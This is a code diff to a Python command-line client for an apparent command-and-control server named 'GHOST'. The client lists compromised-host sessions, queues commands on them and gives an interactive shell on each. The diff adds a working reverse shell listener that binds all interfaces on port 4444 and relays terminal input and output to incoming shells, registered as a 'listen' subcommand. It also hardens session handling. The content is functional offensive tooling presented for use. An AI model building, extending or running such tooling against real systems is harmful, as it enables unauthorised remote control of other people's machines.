@@ -1,11 +1,13 @@
 """
-GHOST Operator CLI – Fully Interactive with Session Picker
+GHOST Operator CLI – Fully Interactive with Session Picker & Reverse Shell Listener
 """
 import argparse
 import json
 import os
 import sys
 import time
+import socket
+import threading
 from datetime import datetime, timezone
 from typing import Optional
 from urllib.parse import quote
@@ -114,6 +116,10 @@ class GhostClient:
         resp.raise_for_status()
         return resp.json()
 
+    # ------------------------------------------------------------------
+    # API methods – encode sid in path
+    # ------------------------------------------------------------------
+
     def list_sessions(self) -> list:
         return self._get("/sessions")
 
@@ -135,6 +141,49 @@ class GhostClient:
 
     def audit(self, limit: int = 50) -> dict:
         return self._get("/audit", params={"limit": limit})
+
+    # ------------------------------------------------------------------
+    # Reverse shell listener
+    # ------------------------------------------------------------------
+
+    def listen(self, port: int) -> None:
+        def handle_client(conn):
+            conn.send(b"GHOST reverse shell connected.\r\n")
+            # Two threads: socket->stdout and stdin->socket
+            def reader():
+                while True:
+                    try:
+                        data = conn.recv(4096)
+                        if not data: break
+                        sys.stdout.buffer.write(data)
+                        sys.stdout.buffer.flush()
+                    except:
+                        break
+            def writer():
+                while True:
+                    try:
+                        line = sys.stdin.readline()
+                        if not line: break
+                        conn.send(line.encode())
+                    except:
+                        break
+            t1 = threading.Thread(target=reader, daemon=True)
+            t2 = threading.Thread(target=writer, daemon=True)
+            t1.start()
+            t2.start()
+            t1.join()
+            t2.join()
+            conn.close()
+
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(('0.0.0.0', port))
+        server.listen(5)
+        info(f"Listening for reverse shells on port {port}...")
+        while True:
+            conn, addr = server.accept()
+            info(f"Incoming shell from {addr[0]}:{addr[1]}")
+            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
 
 # ---------------------------------------------------------------------------
 # Display helpers
@@ -281,13 +330,20 @@ def cmd_shell(client: GhostClient, args) -> None:
             warn("Backgrounding session (not killed).")
             break
         if cmd.lower() == "exit":
-            client.kill(sid)
-            ok("Session killed.")
+            try:
+                client.kill(sid)
+                ok("Session killed.")
+            except requests.HTTPError as e:
+                if e.response.status_code == 404:
+                    warn("Session already gone.")
             break
 
         try:
             client.task(sid, cmd)
         except requests.HTTPError as e:
+            if e.response.status_code == 404:
+                err("Session not found – it may have expired.")
+                break
             err(f"Failed to queue task: {e}")
             continue
 
@@ -299,70 +355,78 @@ def cmd_shell(client: GhostClient, args) -> None:
             try:
                 data = client.results(sid, clear=True)
                 if data.get("results"):
-                    print_results(data)
+                    # Show only the latest result
+                    last = data["results"][-1]
+                    if isinstance(last, dict):
+                        out = last.get("output", "")
+                        ts  = last.get("ts", "")
+                        if ts:
+                            print(c(f"── {ts} ──", GREY))
+                        print(out)
+                    else:
+                        print(last)
+                    print()
                     got_result = True
                     break
             except requests.HTTPError as e:
                 if e.response.status_code == 404:
                     err("Session not found – it may have expired.")
-                    return
-                pass
-
+                    got_result = False
+                    break
+                # other errors: retry
         if not got_result:
-            warn("Timed out waiting for result (task still queued).")
+            warn("Timed out or session lost.")
 
 def cmd_console(client: GhostClient, _args) -> None:
-    """
-    Interactive session picker:
-    - Lists all active sessions with numbers.
-    - User selects a number → drops into shell for that session.
-    """
-    info("Fetching sessions...")
-    sessions = client.list_sessions()
-    if not sessions:
-        warn("No active sessions.")
-        return
-
-    print_sessions(sessions, numbered=True)
-
     while True:
+        info("Fetching sessions...")
         try:
-            choice = input(c("Select session number (or 'q' to quit): ", BOLD + CYAN)).strip()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            warn("Exiting.")
-            return
-
-        if choice.lower() in ("q", "quit", "exit"):
-            info("Goodbye.")
-            return
-
-        if not choice.isdigit():
-            warn("Invalid input – enter a number.")
+            sessions = client.list_sessions()
+        except requests.HTTPError as e:
+            err(f"Failed to fetch sessions: {e}")
+            time.sleep(2)
             continue
 
-        idx = int(choice) - 1
-        if idx < 0 or idx >= len(sessions):
-            warn(f"Invalid number – choose 1–{len(sessions)}")
-            continue
-
-        sid = sessions[idx]["session"]
-        info(f"Connecting to session {c(sid, MAGENTA)}...")
-        # Re‑enter shell mode with this session
-        # We'll reuse the shell logic by creating a mock args object
-        class MockArgs:
-            pass
-        shell_args = MockArgs()
-        shell_args.sid = sid
-        cmd_shell(client, shell_args)
-        # After shell exits, loop back to session list
-        info("Returning to session list.")
-        # Refresh list
-        sessions = client.list_sessions()
         if not sessions:
-            warn("No active sessions left.")
-            return
+            warn("No active sessions. Retrying in 5 seconds...")
+            time.sleep(5)
+            continue
+
         print_sessions(sessions, numbered=True)
+
+        while True:
+            try:
+                choice = input(c("Select session number (or 'q' to quit): ", BOLD + CYAN)).strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                warn("Exiting.")
+                return
+
+            if choice.lower() in ("q", "quit", "exit"):
+                info("Goodbye.")
+                return
+
+            if not choice.isdigit():
+                warn("Invalid input – enter a number.")
+                continue
+
+            idx = int(choice) - 1
+            if idx < 0 or idx >= len(sessions):
+                warn(f"Invalid number – choose 1–{len(sessions)}")
+                continue
+
+            sid = sessions[idx]["session"]
+            info(f"Connecting to session {c(sid, MAGENTA)}...")
+            class MockArgs:
+                pass
+            shell_args = MockArgs()
+            shell_args.sid = sid
+            cmd_shell(client, shell_args)
+            info("Returning to session list.")
+            break
+
+def cmd_listen(client: GhostClient, args) -> None:
+    client.listen(args.port)
 
 # ---------------------------------------------------------------------------
 # Argument parser
@@ -384,7 +448,6 @@ def build_parser() -> argparse.ArgumentParser:
     sub = p.add_subparsers(dest="command", metavar="COMMAND")
 
     sub.add_parser("sessions", help="List active sessions")
-
     t = sub.add_parser("task", help="Queue a command on a session")
     t.add_argument("sid", help="Session ID")
     t.add_argument("cmd", help="Command string to execute")
@@ -402,8 +465,9 @@ def build_parser() -> argparse.ArgumentParser:
     sh = sub.add_parser("shell", help="Interactive shell mode for a session")
     sh.add_argument("sid", help="Session ID")
 
-    # New interactive console command
-    sub.add_parser("console", help="Interactive session picker – list sessions, choose by number, get shell")
+    sub.add_parser("console", help="Interactive session picker")
+    li = sub.add_parser("listen", help="Start reverse shell listener")
+    li.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
 
     return p
 
@@ -419,6 +483,7 @@ COMMAND_MAP = {
     "audit":    cmd_audit,
     "shell":    cmd_shell,
     "console":  cmd_console,
+    "listen":   cmd_listen,
 }
 
 def main() -> None:
@@ -426,7 +491,6 @@ def main() -> None:
     args   = parser.parse_args()
 
     if not args.command:
-        # If no command, default to 'console' (interactive picker)
         args.command = "console"
 
     if not args.token:
